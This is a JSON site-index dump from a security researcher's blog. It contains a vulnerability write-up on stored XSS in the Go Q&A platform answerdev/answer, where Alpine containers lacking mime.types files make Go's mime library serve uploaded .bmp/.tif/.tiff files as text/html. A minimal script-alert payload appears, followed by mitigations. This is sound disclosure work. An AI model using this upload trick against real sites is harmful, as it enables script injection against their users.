https://twitter.com/RuiShang9 Blog: https://shangrui-hash.github.io/en/ Medium: https://medium.com/@hdrw1024 Github: https://github.com/ShangRui-hash Reference # whatwg - C0 control 标准 whatwg - URL parsing 标准 whatwg - validation error A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! EXPLOITING URL PARSERS: THE GOOD, BAD, AND INCONSISTENT HOW FRCKN\u0026rsquo; HARD IS IT TO UNDERSTAND A URL?! - uXSS CVE-2018-6128 How did Masato find the Google Search XSS? Fuzzing Browsers for weird XSS Vectors 2017/Daniel Stenberg/ONE URL STANDARD PLEASE 2022/Daniel Stenberg/DON’T MIX URL PARSERS ","date":"17 March 2023","externalUrl":null,"permalink":"/en/posts/a_research_of_inconsistencies_in_front_and_backend_url_parsers/","section":"Posts","summary":"In August 2022, when digging the SRC of Tianrongxin, I found that redacted teaching and training system was used in a site of Tianrongxin Education, so I downloaded the source code of redacted on github and audited it.","title":"A Research Of The Inconsistency Between WHATWG URL standard And RFC URL standard","type":"posts"},{"content":"","date":"17 March 2023","externalUrl":null,"permalink":"/en/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"answerdev/answer is a question and answer platform which is based on the go language, a few weeks ago I audit of the project, found there is an interesting vulnerability in the image upload function\nThe working principle of the image uploading function of the system is roughly as follows:\nstep1. A user uploads an image file and stores the file in the local file system step2. When images need to be accessed, use the static resource server provided by gin framework to return the uploaded image files to the user as static resources internal/router/static_router.go\n// RegisterStaticRouter register static api router func (a *StaticRouter) RegisterStaticRouter(r *gin.RouterGroup) { r.Static(\u0026#34;/uploads\u0026#34;, a.serviceConfig.UploadPath) } To prevent users from uploading malicious files, the file upload function of the system sets a suffix whitelist. Users can upload files with the suffix in the whitelist\ninternal/service/uploader/upload.go\nFormatExts = map[string]imaging.Format{ \u0026#34;.jpg\u0026#34;: imaging.JPEG, \u0026#34;.jpeg\u0026#34;: imaging.JPEG, \u0026#34;.png\u0026#34;: imaging.PNG, \u0026#34;.gif\u0026#34;: imaging.GIF, \u0026#34;.tif\u0026#34;: imaging.TIFF, \u0026#34;.tiff\u0026#34;: imaging.TIFF, \u0026#34;.bmp\u0026#34;: imaging.BMP, } At first, I built the project locally and tested the file upload function and static resource service: I tried to upload \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; with the suffix .bmp .tif .tiff and access the files through static resource services. I found that the content-types in the returned response messages were image/bmp, image/tiff, image/tiff respectively. These MIME types were normal image types, which could not make the browser parse the contents in the response messages as html\nHowever, what is amazing is that when I use the docker image provided by answer official to build answer:\ndocker run -d -p 9080:80 -v answer-data:/data --name answer answerdev/answer:latest Upload the same file again, then access the file, and find that the Content-Type of the returned http response message is changed to text/html!\nstep1. Upload a picture file step2. Access the file The culprit is the mime standard library # The reason why the Content-Type of bmp/tif/tiff image files is set to text/html in the static resource server implemented by go is that the mime standard library of go language is flawed.\nThe static resource server implemented by the go language generally performs the following steps when it returns a file:\nstep1. Call the mime.TypeByExtension() function to get the Content-Type based on the file suffix step2. If the Content-type returned by the mime.TypeByExtension() function is an empty string, a Server-Side MIME Sniff is implemented to identify the Content-type based on the file Content The implementation of the mime.TypeByExtension() function actually depends on the external mime.types file, which itself maintains a very limited mapping between file suffixes and Content-Type\n/usr/local/go/src/mime/type.go\n// TypeByExtension returns the MIME type associated with the file extension ext. // The extension ext should begin with a leading dot, as in \u0026#34;.html\u0026#34;. // When ext has no associated type, TypeByExtension returns \u0026#34;\u0026#34;. // // Extensions are looked up first case-sensitively, then case-insensitively. // // The built-in table is small but on unix it is augmented by the local // system\u0026#39;s MIME-info database or mime.types file(s) if available under one or // more of these names: // // /usr/local/share/mime/globs2 // /usr/share/mime/globs2 // /etc/mime.types // /etc/apache2/mime.types // /etc/apache/mime.types // // On Windows, MIME types are extracted from the registry. In containerization, the alpine series of images is often used in order to minimize the attack surface and reduce the image size. The mime.types files listed above are not included in the Alpine series of images:\n/usr/local/share/mime/globs2 /usr/share/mime/globs2 /etc/mime.types /etc/apache2/mime.types /etc/apache/mime.types for example:\n/Users/rickshang/Code/SecurityResearch/InTheLab/content_type_lab/golang/fuzzer/main.go\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;mime\u0026#34; ) func main() { exts := []string{\u0026#34;.bmp\u0026#34;, \u0026#34;.gif\u0026#34;, \u0026#34;.jpeg\u0026#34;, \u0026#34;.jpg\u0026#34;, \u0026#34;.png\u0026#34;, \u0026#34;.svg\u0026#34;, \u0026#34;ico\u0026#34;, \u0026#34;.tif\u0026#34;, \u0026#34;.tiff\u0026#34;, \u0026#34;.webp\u0026#34;} for _, ext := range exts { content_type := mime.TypeByExtension(ext) fmt.Printf(\u0026#34;ext:%s content_type:%+v\\n\u0026#34;, ext, content_type) } } Run locally:\ngo run main.go ext:.bmp content_type:image/bmp ext:.gif content_type:image/gif ext:.jpeg content_type:image/jpeg ext:.jpg content_type:image/jpeg ext:.png content_type:image/png ext:.svg content_type:image/svg+xml ext:.ico content_type:image/x-icon ext:.tif content_type:image/tiff ext:.tiff content_type:image/tiff ext:.webp content_type:image/webp Run with the golang official image: golang:1.19-alpine\ndocker run -it --rm -v /Users/rickshang/Code/SecurityResearch/InTheLab/content_type_lab/golang/fuzzer/main.go:/code/main.go -w /code golang:1.19-alpine go run main.go ext:.bmp content_type: ext:.gif content_type:image/gif ext:.jpeg content_type:image/jpeg ext:.jpg content_type:image/jpeg ext:.png content_type:image/png ext:.svg content_type:image/svg+xml ext:.ico content_type: ext:.tif content_type: ext:.tiff content_type: ext:.webp content_type:image/webp In other words, if your static resource server is implemented based on go\u0026rsquo;s mime standard library, When your static resource server uses alpine image containerization, it is likely that Content-Types of bmp/tif/tiff image files will be identified as text/html, leading to stored XSS vulnerabilities.\nSummary # What\u0026rsquo;s interesting about this vulnerability is that it reveals how security issues relate to the environment: just because there are no security issues in test environments doesn\u0026rsquo;t mean there are no security issues in production environments.\nContainerization in pursuit of minimizing attack surfaces also introduces new attack surfaces, the go language mime standard library is a typical example.\nA library implementation that relies on external files -----\u0026gt; containerization-----\u0026gt;Missing external file----\u0026gt; a security issue is born Mitigation measures # The go Language mime standard library maintains a very limited built-in mime type mapping: go/src/mime/type.go\nvar builtinTypesLower = map[string]string{ \u0026#34;.avif\u0026#34;: \u0026#34;image/avif\u0026#34;, \u0026#34;.css\u0026#34;: \u0026#34;text/css; charset=utf-8\u0026#34;, \u0026#34;.gif\u0026#34;: \u0026#34;image/gif\u0026#34;, \u0026#34;.htm\u0026#34;: \u0026#34;text/html; charset=utf-8\u0026#34;, \u0026#34;.html\u0026#34;: \u0026#34;text/html; charset=utf-8\u0026#34;, \u0026#34;.jpeg\u0026#34;: \u0026#34;image/jpeg\u0026#34;, \u0026#34;.jpg\u0026#34;: \u0026#34;image/jpeg\u0026#34;, \u0026#34;.js\u0026#34;: \u0026#34;text/javascript; charset=utf-8\u0026#34;, \u0026#34;.json\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;.mjs\u0026#34;: \u0026#34;text/javascript; charset=utf-8\u0026#34;, \u0026#34;.pdf\u0026#34;: \u0026#34;application/pdf\u0026#34;, \u0026#34;.png\u0026#34;: \u0026#34;image/png\u0026#34;, \u0026#34;.svg\u0026#34;: \u0026#34;image/svg+xml\u0026#34;, \u0026#34;.wasm\u0026#34;: \u0026#34;application/wasm\u0026#34;, \u0026#34;.webp\u0026#34;: \u0026#34;image/webp\u0026#34;, \u0026#34;.xml\u0026#34;: \u0026#34;text/xml; charset=utf-8\u0026#34;, } Solution 1: When packing the image copy the following mime.types file into the container:\n/usr/local/share/mime/globs2 /usr/share/mime/globs2 /etc/mime.types /etc/apache2/mime.types /etc/apache/mime.types Solution 2: Do not add suffixes other than the mime library builtin table to the whitelist when implementing the image upload function, for example,.bmp.ico.tif.tiff\nSolution 3: Use nginx as a static resource server\nFurther research # Do static resource servers in other languages have the same problem after containerization? Does containerization introduce any new security issues? Keep in touch # If you have any questions or good research direction, please feel free to contact me:\nEmail: hdrw1024@gmail.com Twitter: https://twitter.com/RuiShang9 Blog: https://shangrui-hash.github.io/en/ ","date":"2 March 2023","externalUrl":null,"permalink":"/en/posts/xss-via-server-side-mime-sniff/","section":"Posts","summary":"answerdev/answer is a question and answer platform which is based on the go language, a few weeks ago I audit of the project, found there is an interesting vulnerability in the image upload function","title":"Server-Side MIME Sniff resulting from Go language project containerization","type":"posts"},{"content":"","date":"2 March 2023","externalUrl":null,"permalink":"/en/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"2 March 2023","externalUrl":null,"permalink":"/en/tags/xss/","section":"Tags","summary":"","title":"XSS","type":"tags"},{"content":"Hi,I\u0026rsquo;m @rickshang , The Chinese SRC ID is 无在无不在\nI like working on novel attack techniques and finding crazy vulnerabilities\nSRC Ranking # 2023 阔知SRC TOP1 极氪SRC TOP1 百度SRC 迅捷狙击奖-高质量漏洞产出者 2024: 看云SRC TOP1 平安SRC TOP9 顺丰SRC TOP10 新东方SRC TOP5 (年度最佳漏洞奖) 东方甄选SRC TOP1 完美世界SRC TOP5 途虎SRC TOP5 小鹏SRC TOP6 斗鱼SRC TOP1 哈啰SRC TOP1 百度SRC TOP11 (洞察巅峰奖-高质量漏洞产出者) 贝壳SRC TOP11 My CVE list: # CVE-2022-46181 XSS vulnerability in the application image file upload in gotify/server CVE-2023-22463 JwtSigKey hardcoded causes the k8s cluster to take over in kubeoperator/kubepi There are other general vulnerabilities that I can\u0026rsquo;t publicly disclose yet because they haven\u0026rsquo;t been fixed\nMy open source project: # php-lab bucket-takeover-lab Keep In Touch # 微信: xdujim QQ群: 575701862 (备注来自博客) ","date":"17 September 2021","externalUrl":null,"permalink":"/about/","section":"1337妙妙屋","summary":"Hi,I\u0026rsquo;m @rickshang , The Chinese SRC ID is 无在无不在","title":"whoami","type":"page"},{"content":"","externalUrl":null,"permalink":"/en/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/en/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/en/series/","section":"Series","summary":"","title":"Series","type":"series"}]